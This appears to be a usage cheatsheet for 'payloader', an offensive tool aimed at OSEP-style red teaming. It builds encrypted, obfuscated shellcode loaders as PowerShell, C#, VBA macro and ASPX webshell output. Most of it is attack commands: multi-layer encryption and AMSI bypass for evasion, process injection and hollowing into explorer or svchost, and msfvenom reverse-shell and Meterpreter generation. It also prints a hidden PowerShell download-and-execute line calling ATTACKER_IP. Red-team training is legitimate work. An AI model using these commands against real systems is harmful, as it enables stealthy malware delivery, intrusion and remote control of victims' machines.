# payloader – Usage Cheatsheet

> **For authorized security testing and educational use only.**

---

## Quick Start

```bash
# Default: XOR-encrypted PowerShell loader
python3 payloader.py shellcode.bin

# From .exe (auto-converts via donut)
python3 payloader.py implant.exe
```

---

## Encryption Algorithms

| Algorithm | Flag | Key Format | Notes |
|-----------|------|------------|-------|
| XOR | `--encryption XOR` | `--key 0xAA` or `--key 0xDEADBEEF` | Default. Single or multi-byte key. |
| AES-256-CBC | `--encryption AES256` | `--key "secret"` `--iv "16byteIVstring!"` | IV random if omitted. Requires `pycryptodome`. |
| RC4 | `--encryption RC4` | `--key "mykey"` | Lightweight stream cipher. |
| ROT-N | `--encryption ROT` | `--rot-n 13` | Caesar-style byte rotation. |

```bash
python3 payloader.py shell.bin --encryption XOR    --key 0xAA
python3 payloader.py shell.bin --encryption AES256 --key "s3cr3tK3y" --iv "1234567890abcdef"
python3 payloader.py shell.bin --encryption RC4    --key "MyRC4Key"
python3 payloader.py shell.bin --encryption ROT    --rot-n 13
```

---

## Multi-Layer Chaining (`--chain`)

Chain format: `algo:KEY=value,algo:KEY=value;IV=value,...`
- Stages separated by **commas**
- Parameters within a stage separated by **semicolons**
- Encryption applied **left → right**; decryption stubs generated **right → left**

```bash
# 2-layer: XOR then ROT
python3 payloader.py shell.bin \
  --chain "xor:KEY=0xAA,rot:N=13"

# 3-layer: XOR → RC4 → ROT  (MacroPhantom style)
python3 payloader.py shell.bin \
  --chain "xor:KEY=0xBB,rc4:KEY=osepkey,rot:N=7"

# 3-layer: AES → XOR → ROT  (CerberusObfuscator style)
python3 payloader.py shell.bin \
  --chain "aes256:KEY=MySecret;IV=1234567890abcdef,xor:KEY=0xCC,rot:N=42"

# 4-layer: AES → RC4 → XOR → ROT  (quad-layer)
python3 payloader.py shell.bin \
  --chain "aes256:KEY=layer1key,rc4:KEY=layer2,xor:KEY=0xDD,rot:N=5"

# Random keys (omit KEY= for auto-generated random key per run)
python3 payloader.py shell.bin \
  --chain "aes256,xor,rot:N=13"
```

---

## Output Formats (`--output-format`)

Comma-separated, multiple formats in one run:

| Format | Flag | Supports |
|--------|------|---------|
| PowerShell | `ps1` | All algorithms, AMSI bypass, Chimera obfuscation |
| C# | `cs` | All algorithms, 4 injection methods |
| VBA Macro | `vba` | XOR, RC4 only (no AES) |
| ASPX | `aspx` | XOR, ROT only |
| Raw Binary | `bin` | All algorithms |

```bash
# Single format
python3 payloader.py shell.bin --output-format cs

# Multiple formats in one run
python3 payloader.py shell.bin --output-format ps1,cs,vba,bin

# All formats (VBA/ASPX require XOR or ROT chain)
python3 payloader.py shell.bin \
  --encryption XOR --key 0xAA \
  --output-format ps1,vba,cs,aspx,bin
```

---

## C# Injection Methods (`--injection-method`)

| Method | Flag | Technique |
|--------|------|-----------|
| VirtualAlloc | `valloc` | Self-process, `VirtualAlloc` + `CreateThread` |
| Process Inject | `pinject` | `OpenProcess` + `VirtualAllocEx` + `CreateRemoteThread` |
| NT Section | `ntinject` | `NtCreateSection` + `NtMapViewOfSection` + `RtlCreateUserThread` |
| Process Hollow | `hollow` | `CreateProcess SUSPENDED` + hijack `Rip` + `ResumeThread` |

```bash
# Self-process (default)
python3 payloader.py shell.bin --output-format cs --injection-method valloc

# Inject into explorer.exe (default target)
python3 payloader.py shell.bin --output-format cs --injection-method pinject

# Inject into a specific process
python3 payloader.py shell.bin --output-format cs \
  --injection-method pinject --target-process svchost

# NT-level section injection (lower API footprint)
python3 payloader.py shell.bin --output-format cs --injection-method ntinject

# Process hollowing into svchost
python3 payloader.py shell.bin --output-format cs \
  --injection-method hollow
```

---

## PowerShell Obfuscation (`-l` / `--obfuscation-level`)

| Level | Effect |
|-------|--------|
| `1` | Light – comments + minimal dead code |
| `2` | Medium – backticks + indentation randomization |
| `3` | High – string chunking + variable rename (default) |
| `4` | Higher – aggressive chunking |
| `5` | Insane – maximum fragmentation |

```bash
python3 payloader.py shell.bin -l 1          # Light
python3 payloader.py shell.bin -l 5          # Insane
python3 payloader.py shell.bin --no-obfuscate # Off (for debugging)
python3 payloader.py shell.bin -d             # Debug Write-Host output
```

---

## Donut Options (`.exe` / `.dll` → shellcode)

```bash
# Default: x86+amd64, AMSI bypass continues on fail
python3 payloader.py implant.exe

# x64 only
python3 payloader.py implant.exe --arch 2

# Pass command line args to the implant
python3 payloader.py implant.exe --params "192.168.1.100 4444"

# No AMSI bypass from donut (handle in PS1 layer instead)
python3 payloader.py implant.exe --bypass 1
```

---

## Common OSEP Combinations

```bash
# --- OSEP: C# loader, AES-256, remote thread injection ---
python3 payloader.py shell.bin \
  --encryption AES256 --key "0s3pExamKey2026!" \
  --output-format cs --injection-method pinject \
  --target-process explorer

# --- OSEP: VBA macro with dual-layer XOR+ROT (MacroPhantom style) ---
python3 payloader.py shell.bin \
  --chain "xor:KEY=0xAA,rot:N=13" \
  --output-format vba

# --- OSEP: Obfuscated PS1 with RC4, max obfuscation ---
python3 payloader.py shell.bin \
  --encryption RC4 --key "osepRC4key" \
  --output-format ps1 -l 5

# --- OSEP: ASPX webshell with XOR ---
python3 payloader.py shell.bin \
  --encryption XOR --key 0xBEEF \
  --output-format aspx

# --- OSEP: All formats, 3-layer chain, PS1 + CS + VBA ---
python3 payloader.py shell.bin \
  --chain "xor:KEY=0xAA,rc4:KEY=mykey,rot:N=7" \
  --output-format ps1,cs,vba \
  --injection-method ntinject -l 4

# --- OSEP: .exe implant → all formats, obfuscation level 5 ---
python3 payloader.py implant.exe \
  --arch 2 --bypass 3 \
  --chain "aes256:KEY=ImplantKey2026,xor:KEY=0xCC" \
  --output-format ps1,cs -l 5
```

---

## Generate Shellcode with msfvenom

```bash
# x64 reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.bin

# x64 Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f raw -o met.bin

# x64 staged (for smaller payloads)
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o staged.bin
```

Then pass directly to the tool:

```bash
python3 payloader.py shell.bin --chain "aes256:KEY=MyKey,xor:KEY=0xAA" --output-format ps1,cs -l 4
```

---

## Delivery (PowerShell output)

The tool prints these automatically after generating a `.ps1`:

```powershell
# Step 1 – host the file
sudo python3 -m http.server 80

# Step 2 – target executes (direct)
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/abc123.ps1')"

# Step 3 – target executes (base64-encoded, printed by tool)
powershell -nop -w hidden -enc <BASE64>
```

---

## Validation & Testing

```bash
# Verify a chain round-trips correctly
python3 tests/validate_chain.py --chain "xor:KEY=0xAA,rc4:KEY=test,rot:N=13"

# Validate all built-in chain combinations
python3 tests/validate_chain.py --all

# Validate against your own shellcode file
python3 tests/validate_chain.py --chain "aes256:KEY=MyKey" --input shell.bin

# Run full unit test suite
python3 -m unittest discover tests/ -v
```

---

## Format Compatibility Matrix

| Algorithm | ps1 | cs | vba | aspx | bin |
|-----------|-----|----|-----|------|-----|
| XOR | ✅ | ✅ | ✅ | ✅ | ✅ |
| AES-256 | ✅ | ✅ | ❌ | ❌ | ✅ |
| RC4 | ✅ | ✅ | ✅ | ❌ | ✅ |
| ROT-N | ✅ | ✅ | ✅ | ✅ | ✅ |

> **VBA:** AES is too heavy for macro execution — use XOR or RC4.  
> **ASPX:** Only XOR and ROT to avoid assembly dependencies in web context.

---

## Installation

```bash
pip install pycryptodome    # Required for AES-256-CBC
pip install donut-shellcode  # Required for .exe/.dll conversion
```
